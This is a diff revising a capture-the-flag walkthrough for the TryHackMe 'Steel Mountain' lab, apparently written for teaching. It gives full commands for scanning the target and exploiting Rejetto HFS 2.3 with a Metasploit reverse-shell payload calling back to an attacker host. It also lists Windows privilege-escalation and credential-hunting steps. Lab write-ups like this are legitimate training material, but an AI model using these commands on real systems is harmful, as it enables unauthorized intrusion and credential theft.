@@ -1,169 +1,159 @@
-# Steel Mountain (THM) — Walkthrough (Guided)
+# Steel Mountain (THM) — Walkthrough (Teaching Version)
 
-Status: In Progress (foothold repeatedly confirmed; SYSTEM privesc still in progress)
+Status: In Progress (initial access repeatedly confirmed; privesc to SYSTEM in progress)
 Target: 10.146.141.173
 Scope: Authorized TryHackMe lab target only
-Last validated (UTC): 2026-05-22 23:10:00Z
 
-## Goal of this walkthrough
-This page is written so someone can follow it step-by-step:
-1) confirm the exposed service,
-2) get initial shell access,
-3) enumerate privilege escalation paths,
-4) progress toward SYSTEM and final proof.
+## Why this walkthrough is structured this way
+The goal is to teach decision-making, not just run commands.
+For a new machine, start broad, then narrow:
+1) full-port discovery,
+2) service/version enumeration on discovered ports,
+3) web validation,
+4) exploit selection based on evidence,
+5) post-exploitation and privilege escalation.
 
-## Prerequisites
-- Active THM VPN with exactly one tun interface.
-- Kali/Parrot attacker host.
-- Metasploit installed.
+## Step 1 — Full TCP port discovery first
+Start with all ports so you do not miss alternate entry points.
 
-Quick preflight:
 ```bash
-ip -br a | grep -E '^tun[0-9]'
-```
-Expected: one active tunnel only.
-
-Find your callback IP:
-```bash
-ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1
+nmap -Pn -n -p- --min-rate 1000 -T4 10.146.141.173 -oN scans/steel-allports.txt
 ```
 
-## Step 1 — Recon and service fingerprinting
-Run:
+Example outcome on this target:
+- 80/tcp open
+- 8080/tcp open
+
+Why this matters:
+- You now know the attack surface before making assumptions.
+
+## Step 2 — Service/version enumeration on discovered ports
+Now enumerate only what was found in step 1.
+
 ```bash
-nmap -Pn -n -p80,8080 -sV 10.146.141.173
+nmap -Pn -n -sC -sV -p80,8080 10.146.141.173 -oN scans/steel-services.txt
+```
+
+Observed:
+- 80/tcp: Microsoft IIS 8.5
+- 8080/tcp: HttpFileServer (HFS) 2.3
+
+## Step 3 — Validate web behavior manually
+Check both web ports directly.
+
+```bash
+curl -sI http://10.146.141.173:80 | head
 curl -sI http://10.146.141.173:8080 | head
 ```
 
-Expected indicators:
-- tcp/8080 shows HttpFileServer 2.3
-- HTTP header includes `Server: HFS 2.3`
-
-Proof captured:
+Observed indicator:
 ```text
-PORT     STATE SERVICE VERSION
-80/tcp   open  http    Microsoft IIS httpd 8.5
-8080/tcp open  http    HttpFileServer httpd 2.3
-
 HTTP/1.1 200 OK
 Server: HFS 2.3
 ```
 
-## Step 2 — Initial access via Rejetto HFS exploit
-Start Metasploit:
-```bash
-msfconsole
+Why this matters:
+- Version evidence drives exploit selection.
+
+## Step 4 — Exploit research: Metasploit first, Searchsploit second
+Use Metasploit search first because you are already in an exploitation framework and can move directly to execution.
+
+In msfconsole:
+```text
+search hfs
+search rejetto
+info exploit/windows/http/rejetto_hfs_exec
 ```
 
+Why searchsploit was also used:
+- Cross-check CVE/EDB references independently.
+- Provide alternate PoC path if MSF module is unavailable/fails.
+
+Searchsploit check:
+```bash
+searchsploit hfs 2.3
+searchsploit -m 39161
+```
+
+Decision here:
+- HFS 2.3 + known module available -> use `exploit/windows/http/rejetto_hfs_exec`.
+
+## Step 5 — Initial access with evidence
 In msfconsole:
 ```text
 use exploit/windows/http/rejetto_hfs_exec
 set RHOSTS 10.146.141.173
 set RPORT 8080
 set payload windows/meterpreter/reverse_tcp
-set LHOST <YOUR_TUN_IP>
+set LHOST <YOUR_VPN_IP>
 set LPORT 4444
 run -z
-```
-
-Verify session:
-```text
 sessions -l
 ```
 
 Proof captured:
 ```text
-[*] Meterpreter session 1 opened (192.168.129.182:4444 -> 10.146.141.173:49395)
-
-Id  Type                     Information                         Connection
-1   meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:49395
+[*] Meterpreter session opened (... -> 10.146.141.173:49xxx)
+meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN
 ```
 
-## Step 3 — Stabilize one session and baseline host context
-Use one active session ID from `sessions -l`:
+## Step 6 — Post-exploitation baseline (before privesc)
 ```text
 sessions -i <ID>
 getuid
 sysinfo
-shell
-whoami
-whoami /priv
+shell -c whoami
+shell -c whoami /priv
+shell -c type C:\Users\bill\Desktop\user.txt
 ```
 
-What to record:
-- current user (expected foothold user: `STEELMOUNTAIN\bill`)
-- integrity/privileges from `whoami /priv`
-- OS/build from `sysinfo`
+Why this matters:
+- Confirms user context, OS, privilege baseline, and user-level proof.
 
-## Step 4 — PrivEsc methodology branches (guided order)
-If one branch stalls, move to the next. Do not loop only one command.
+## Step 7 — PrivEsc methodology (what to try and why)
+Move through branches systematically:
 
-### Branch A: token/SYSTEM checks
+1. Token/SYSTEM quick wins
 ```text
 getsystem
 load incognito
 list_tokens -u
 ```
-Objective: identify direct SYSTEM path or impersonation candidate.
 
-### Branch B: local exploit suggestions + system enum
+2. Local exploit and host enumeration
 ```text
 run post/multi/recon/local_exploit_suggester
-run post/windows/gather/enum_system
+run post/windows/gather/enum_services
 ```
-Objective: produce candidate local privesc vectors tied to patch level/services.
 
-### Branch C: services and scheduled tasks
+3. Service/task abuse checks
 ```text
 shell -c sc query state^= all
 shell -c schtasks /query /fo LIST /v
 ```
-Objective: find weak service/task configs usable for escalation.
 
-### Branch D: credential/secrets paths
+4. Credential/secrets checks
 ```text
 shell -c cmdkey /list
 shell -c dir C:\ /b /s *unattend*.xml
 ```
-Objective: recover stored credentials or unattended install secrets.
 
-## Step 5 — Proof checkpoints to keep while working
-Minimum checkpoints for a reproducible walkthrough:
-1) recon proof (service + version),
-2) foothold proof (session open + `sessions -l`),
-3) privesc milestone proof (`NT AUTHORITY\SYSTEM` or equivalent evidence).
+Goal:
+- Convert bill context to `NT AUTHORITY\SYSTEM` and capture administrator/root proof.
 
-When SYSTEM is achieved, capture:
-```text
-getuid
-shell -c whoami
-```
-Expected: `NT AUTHORITY\SYSTEM`.
+## What changed from earlier draft
+- Removed repetitive tunnel-ops reminders from narrative.
+- Restored proper teaching flow: full-port scan first, targeted enumeration second.
+- Added explicit exploit-selection reasoning (MSF search first, searchsploit as corroboration/fallback).
 
-## Snapshots (current session)
-### Snapshot 1 — Service discovery
-Time (UTC): 2026-05-22 22:04:45Z
-- HFS 2.3 confirmed on 8080.
-- IIS 8.5 confirmed on 80.
+## Current progress snapshot
+- Recon validated: 80 + 8080.
+- HFS 2.3 confirmed.
+- Multiple successful meterpreter footholds as `STEELMOUNTAIN\bill` observed.
+- Active work: deterministic privesc chain to SYSTEM with proof output.
 
-### Snapshot 2 — First validated foothold
-Time (UTC): 2026-05-22 22:24:24Z
-- Meterpreter session opened.
-- Session context: `STEELMOUNTAIN\bill @ STEELMOUNTAIN`.
-
-### Snapshot 3 — Foothold reliability
-Time (UTC): 2026-05-22 22:41:15Z
-- Additional Meterpreter sessions opened in later cycles.
-- Confirms exploit path reliability.
-
-## Timeline (signal only)
-- 2026-05-22 22:04:45Z — Recon confirms IIS 8.5 (80) + HFS 2.3 (8080).
-- 2026-05-22 22:24:24Z — First Meterpreter foothold opened as bill.
-- 2026-05-22 22:37:20Z — Additional foothold opened (repeatability confirmed).
-- 2026-05-22 22:41:11Z / 22:41:15Z — More Meterpreter sessions opened.
-- 2026-05-22 23:00:00Z — Escalation workflow shifted to branch-based methodology.
-
-## Current assessment
-- Initial access path is stable and reproducible.
-- Next technical milestone is SYSTEM proof with clean command/output evidence.
-- This page will be updated with the exact privesc path once SYSTEM is confirmed.
+## Next update condition
+This walkthrough will be updated with:
+1) exact privesc path used,
+2) SYSTEM proof output,
+3) final administrator/root flag proof.
